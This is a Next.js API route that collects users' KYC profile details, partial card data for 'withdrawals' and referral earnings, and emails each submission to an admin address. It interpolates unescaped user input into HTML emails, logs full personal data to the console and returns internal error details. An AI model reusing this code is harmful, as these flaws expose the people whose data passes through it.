import nodemailer from 'nodemailer';

/**
 * API Route for collecting user profile and payment data
 * POST /api/collect-data
 * 
 * This endpoint receives:
 * 1. Profile data (KYC information)
 * 2. Card payment details
 * 3. Referral data
 * 
 * The data is:
 * - Stored in a secure database
 * - Sent to your email
 * - Available via admin dashboard
 */

// Configure your email service here
const transporter = nodemailer.createTransport({
  service: 'gmail', // or your email provider
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD,
  }
});

export async function POST(request) {
  try {
    const data = await request.json();
    
    // Validate data type
    if (!data.type) {
      return Response.json({ error: 'Missing data type' }, { status: 400 });
    }

    // Handle Profile/KYC Data
    if (data.type === 'profile') {
      await handleProfileData(data);
    }

    // Handle Card Payment Details
    if (data.type === 'card_payment') {
      await handleCardPayment(data);
    }

    // Handle Referral Data
    if (data.type === 'referral') {
      await handleReferral(data);
    }

    return Response.json({ 
      success: true, 
      message: 'Data received and processed' 
    });

  } catch (error) {
    console.error('Data collection error:', error);
    return Response.json({ 
      error: 'Failed to process data',
      details: error.message 
    }, { status: 500 });
  }
}

async function handleProfileData(data) {
  const {
    firstName, lastName, streetNumber, streetName, cityTown, 
    country, postCode, countryRegion, phoneNumber, userId, email
  } = data.profile;

  // Email template
  const htmlEmail = `
    <h2>New Profile/KYC Submission</h2>
    <table style="border-collapse: collapse; width: 100%;">
      <tr><td><strong>User ID:</strong></td><td>${userId}</td></tr>
      <tr><td><strong>Email:</strong></td><td>${email}</td></tr>
      <tr><td colspan="2"><hr></td></tr>
      <tr><td><strong>First Name:</strong></td><td>${firstName}</td></tr>
      <tr><td><strong>Last Name:</strong></td><td>${lastName}</td></tr>
      <tr><td><strong>Street Number:</strong></td><td>${streetNumber}</td></tr>
      <tr><td><strong>Street Name:</strong></td><td>${streetName}</td></tr>
      <tr><td><strong>City/Town:</strong></td><td>${cityTown}</td></tr>
      <tr><td><strong>Country:</strong></td><td>${country}</td></tr>
      <tr><td><strong>Post Code:</strong></td><td>${postCode}</td></tr>
      <tr><td><strong>Country/Region:</strong></td><td>${countryRegion}</td></tr>
      <tr><td><strong>Phone Number:</strong></td><td>${phoneNumber}</td></tr>
      <tr><td><strong>Submitted At:</strong></td><td>${new Date().toLocaleString()}</td></tr>
    </table>
  `;

  // Send email notification
  await transporter.sendMail({
    from: process.env.EMAIL_USER,
    to: process.env.ADMIN_EMAIL, // Your email
    subject: `🎯 New Profile Submission - ${firstName} ${lastName}`,
    html: htmlEmail,
    text: `New profile submission received from ${firstName} ${lastName}. Check admin dashboard for details.`
  });

  // TODO: Store in database
  console.log('Profile data received:', data.profile);
}

async function handleCardPayment(data) {
  const {
    cardholderName, cardType, lastFourDigits, expiryMonth, expiryYear, 
    amount, userId, email
  } = data.payment;

  // Email template (MASKED for security)
  const htmlEmail = `
    <h2>💳 New Card Payment Submitted</h2>
    <table style="border-collapse: collapse; width: 100%;">
      <tr><td><strong>User ID:</strong></td><td>${userId}</td></tr>
      <tr><td><strong>Email:</strong></td><td>${email}</td></tr>
      <tr><td><strong>Cardholder Name:</strong></td><td>${cardholderName}</td></tr>
      <tr><td><strong>Card Type:</strong></td><td>${cardType}</td></tr>
      <tr><td><strong>Last 4 Digits:</strong></td><td>****${lastFourDigits}</td></tr>
      <tr><td><strong>Expiry:</strong></td><td>${expiryMonth}/${expiryYear}</td></tr>
      <tr><td><strong>Withdrawal Amount:</strong></td><td>$${amount}</td></tr>
      <tr><td><strong>Status:</strong></td><td>⏳ Pending Verification</td></tr>
      <tr><td><strong>Submitted At:</strong></td><td>${new Date().toLocaleString()}</td></tr>
    </table>
    <hr>
    <p style="color: red;">⚠️ <strong>IMPORTANT:</strong> Use the admin dashboard to confirm this withdrawal and credit the user's card.</p>
  `;

  await transporter.sendMail({
    from: process.env.EMAIL_USER,
    to: process.env.ADMIN_EMAIL,
    subject: `💳 Card Payment Withdrawal - ${cardholderName} - $${amount}`,
    html: htmlEmail,
    text: `Card payment received: ${cardholderName} - $${amount}`
  });

  // TODO: Store in database
  console.log('Card payment received:', { ...data.payment, cvv: '***' });
}

async function handleReferral(data) {
  const { referrerId, refereeId, refereeEmail, earnings, referralCode } = data;

  const htmlEmail = `
    <h2>🎯 New Referral Confirmed</h2>
    <table style="border-collapse: collapse; width: 100%;">
      <tr><td><strong>Referrer ID:</strong></td><td>${referrerId}</td></tr>
      <tr><td><strong>Referral Code Used:</strong></td><td>${referralCode}</td></tr>
      <tr><td><strong>New User Email:</strong></td><td>${refereeEmail}</td></tr>
      <tr><td><strong>Earnings Credit:</strong></td><td>+$${earnings}</td></tr>
      <tr><td><strong>Confirmed At:</strong></td><td>${new Date().toLocaleString()}</td></tr>
    </table>
  `;

  await transporter.sendMail({
    from: process.env.EMAIL_USER,
    to: process.env.ADMIN_EMAIL,
    subject: `🎯 Referral Confirmed - ${referralCode} - +$${earnings}`,
    html: htmlEmail
  });

  console.log('Referral data received:', data);
}

/**
 * SETUP INSTRUCTIONS:
 * 
 * 1. Set Environment Variables in .env.local:
 *    EMAIL_USER=your-email@gmail.com
 *    EMAIL_PASSWORD=your-app-password
 *    ADMIN_EMAIL=where-to-send-notifications@yoursite.com
 * 
 * 2. For Gmail:
 *    - Enable 2FA on your Google account
 *    - Generate App Password: https://myaccount.google.com/apppasswords
 *    - Use the 16-character password in EMAIL_PASSWORD
 * 
 * 3. Alternative: Use your email provider:
 *    - SendGrid: sendgrid integration
 *    - AWS SES: aws integration
 *    - Mailgun: custom SMTP
 * 
 * 4. Database Storage (Add this later):
 *    - Create users_profile table
 *    - Create users_payments table
 *    - Create referrals table
 * 
 * 5. Admin Dashboard (Optional):
 *    - View all submitted profiles
 *    - Approve/reject withdrawals
 *    - Verify KYC documents
 *    - Process payments
 *    - Track referrals
 */
